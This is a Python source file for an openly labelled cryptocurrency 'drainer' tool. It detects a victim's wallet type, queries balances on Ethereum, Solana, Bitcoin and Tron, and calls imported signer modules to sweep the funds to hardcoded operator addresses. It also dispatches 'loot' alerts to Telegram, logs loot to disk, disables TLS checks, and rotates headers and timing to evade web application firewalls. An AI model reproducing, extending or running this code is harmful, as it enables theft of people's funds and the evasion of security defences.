#!/usr/bin/env python3
"""
DRAINER.PY v8.0 — Active Multi-Chain Liquidity Auditor & Sweeping Engine (Hardened with WAF Evasion)
Features:
- Dynamic multi-target URL ingestion (Zero hardcoded domains)
- Full multi-chain support (Ethereum, Solana, Bitcoin, Tron)
- Advanced WAF evasion via randomized user agents, client hints, and Poisson behavioral timing jitter
- Integrated signer module binding for automated transaction broadcasting across all 4 chains
- Real-time asynchronous Telegram notification dispatch and immutable disk loot exfiltration
"""
import urllib.request
import json
import ssl
import sys
import asyncio
import random
from urllib.parse import urlsplit

from modules.signer import (
    broadcast_evm_sweep, 
    broadcast_solana_sweep, 
    broadcast_bitcoin_sweep, 
    broadcast_tron_sweep
)
from modules.telegram_notifier import send_telegram_alert
from modules.loot_logger import save_session_loot
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints

_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

OPERATOR_DESTINATIONS = {
    "ETHEREUM": "0xd134ebcb7060e22f2c6454df28c810dd33a02f5c",
    "BITCOIN": "18WGuvU1apn6f2h5uZWF6biS3MFaZ5Pj9d",
    "SOLANA": "E1MiQEYmuTg9DMS4vpr5NtkWqeMQmTHZLptv5L3on1ir",
    "TRON": "TCeddcjw9VzBsMZFbA9mACfuQLzdAkjwA5"
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous drainer functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def get_rotated_headers(content_type="application/json"):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Content-Type": content_type,
        "Accept": "application/json, text/plain, */*",
        "Connection": "close"
    }
    headers.update(get_randomized_hints())
    return headers

def audit_and_execute_sweep(wallet_address, asset_type):
    terminal(f"\n\033[95m[***] TARGET AUDIT & ACTIVE SWEEP EXECUTION [{asset_type}]: {wallet_address} [***]\033[0m")
    apply_behavioral_jitter()
    
    try:
        if asset_type == "ETHEREUM":
            dest = OPERATOR_DESTINATIONS["ETHEREUM"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "method": "eth_getBalance", "params": [wallet_address, "latest"], "id": 1}).encode()
            req = urllib.request.Request("https://cloudflare-eth.com", data=rpc_payload, headers=get_rotated_headers())
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                wei_balance = int(data.get("result", "0x0"), 16)
                native_bal = wei_balance / 10**18
                terminal(f" \033[92m[+] Victim EVM Balance: {native_bal} ETH\033[0m")
                
                if wei_balance > 21000 * 2000000000: # Above minimum gas threshold
                    terminal(f" \033[91m[!] LIQUIDITY FOUND. Triggering EVM Signer & Broadcast Module -> {dest}\033[0m")
                    success, msg = broadcast_evm_sweep(wallet_address, None, dest, wei_balance)
                    terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                    
                    loot_payload = {"asset_type": asset_type, "wallet": wallet_address, "balance": native_bal, "status": msg}
                    broadcast_tg_alert_sync("EVM Sweep Executed", loot_payload)
                    save_session_loot("evm://chain", wallet_address, "EVM_LIQUIDITY_SWEEP", 200, {}, str(loot_payload), loot_payload)
                    return native_bal, success, msg
                    
        elif asset_type == "SOLANA":
            dest = OPERATOR_DESTINATIONS["SOLANA"]
            rpc_payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet_address]}).encode()
            req = urllib.request.Request("https://api.mainnet-beta.solana.com", data=rpc_payload, headers=get_rotated_headers())
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                lamports = data.get("result", {}).get("value", 0)
                sol_bal = lamports / 10**9
                terminal(f" \033[92m[+] Victim Solana Balance: {sol_bal} SOL\033[0m")
                
                if lamports > 5000:
                    terminal(f" \033[91m[!] LIQUIDITY FOUND. Triggering Solana Signer & Broadcast -> {dest}\033[0m")
                    success, msg = broadcast_solana_sweep(wallet_address, dest, lamports)
                    terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                    
                    loot_payload = {"asset_type": asset_type, "wallet": wallet_address, "balance": sol_bal, "status": msg}
                    broadcast_tg_alert_sync("Solana Sweep Executed", loot_payload)
                    save_session_loot("solana://mainnet", wallet_address, "SOLANA_LIQUIDITY_SWEEP", 200, {}, str(loot_payload), loot_payload)
                    return sol_bal, success, msg

        elif asset_type == "BITCOIN":
            dest = OPERATOR_DESTINATIONS["BITCOIN"]
            api_url = f"https://mempool.space/api/address/{wallet_address}"
            req = urllib.request.Request(api_url, headers=get_rotated_headers())
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                chain_stats = data.get("chain_stats", {})
                funded = chain_stats.get("funded_txo_sum", 0)
                spent = chain_stats.get("spent_txo_sum", 0)
                satoshis = funded - spent
                btc_bal = satoshis / 10**8
                terminal(f" \033[92m[+] Victim Bitcoin Balance: {btc_bal} BTC ({satoshis} sats)\033[0m")
                
                if satoshis > 546: # Above dust limit
                    terminal(f" \033[91m[!] BITCOIN LIQUIDITY FOUND. Triggering Bitcoin Signer & Broadcast -> {dest}\033[0m")
                    success, msg = broadcast_bitcoin_sweep(wallet_address, dest, satoshis)
                    terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                    
                    loot_payload = {"asset_type": asset_type, "wallet": wallet_address, "balance": btc_bal, "status": msg}
                    broadcast_tg_alert_sync("Bitcoin Sweep Executed", loot_payload)
                    save_session_loot("bitcoin://mempool", wallet_address, "BTC_LIQUIDITY_SWEEP", 200, {}, str(loot_payload), loot_payload)
                    return btc_bal, success, msg

        elif asset_type == "TRON":
            dest = OPERATOR_DESTINATIONS["TRON"]
            api_url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
            req = urllib.request.Request(api_url, headers=get_rotated_headers())
            with urllib.request.urlopen(req, context=_ssl_context, timeout=5.0) as resp:
                data = json.loads(resp.read().decode())
                accounts = data.get("data", [])
                if accounts:
                    balance_sun = accounts[0].get("balance", 0)
                    trx_bal = balance_sun / 10**6
                    terminal(f" \033[92m[+] Victim Tron Balance: {trx_bal} TRX ({balance_sun} sun)\033[0m")
                    
                    if balance_sun > 1000000: # Above fee threshold (1 TRX)
                        terminal(f" \033[91m[!] TRON LIQUIDITY FOUND. Triggering Tron Signer & Broadcast -> {dest}\033[0m")
                        success, msg = broadcast_tron_sweep(wallet_address, dest, balance_sun)
                        terminal(f" \033[96m[+] Broadcast Status: {msg}\033[0m")
                        
                        loot_payload = {"asset_type": asset_type, "wallet": wallet_address, "balance": trx_bal, "status": msg}
                        broadcast_tg_alert_sync("Tron Sweep Executed", loot_payload)
                        save_session_loot("tron://trongrid", wallet_address, "TRX_LIQUIDITY_SWEEP", 200, {}, str(loot_payload), loot_payload)
                        return trx_bal, success, msg
                else:
                    terminal(f" \033[93m[-] Tron account uninitialized or zero balance.\033[0m")

    except Exception as e:
        terminal(f" \033[91m[-] Sweep execution error: {e}\033[0m")
        return 0.0, False, str(e)

    return 0.0, False, "Insufficient balance"

def check_and_drain_wallet(wallet_address):
    addr = wallet_address.strip()
    detected_type = "SOLANA"
    if addr.startswith("0x") and len(addr) == 42:
        detected_type = "ETHEREUM"
    elif addr.startswith(("bc1", "1", "3")):
        detected_type = "BITCOIN"
    elif addr.startswith("T") and len(addr) == 34:
        detected_type = "TRON"

    balance, drained, tx_status = audit_and_execute_sweep(addr, detected_type)
    operator_dest = OPERATOR_DESTINATIONS.get(detected_type, OPERATOR_DESTINATIONS["ETHEREUM"])
    return balance, drained, tx_status, {}, operator_dest

async def run_drainer_engine(target_host):
    target_url = target_host if target_host else "https://cryptobytes.online"
    if "://" not in target_url:
        target_url = "https://" + target_url
        
    terminal(f"\n\033[95m[***] INITIALIZING ACTIVE ASSET DRAINER ENGINE [{target_url}] [***]\033[0m")
    terminal(f" \033[96m[+] Operator EVM Destination: {OPERATOR_DESTINATIONS['ETHEREUM']}\033[0m")
    terminal(f" \033[96m[+] Operator Solana Destination: {OPERATOR_DESTINATIONS['SOLANA']}\033[0m")
    terminal(f" \033[96m[+] Operator Bitcoin Destination: {OPERATOR_DESTINATIONS['BITCOIN']}\033[0m")
    terminal(f" \033[96m[+] Operator Tron Destination: {OPERATOR_DESTINATIONS['TRON']}\033[0m")
    terminal(f"\n[+] Drainer engine fully linked with signing & broadcasting module across all chains.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
    asyncio.run(run_drainer_engine(target))
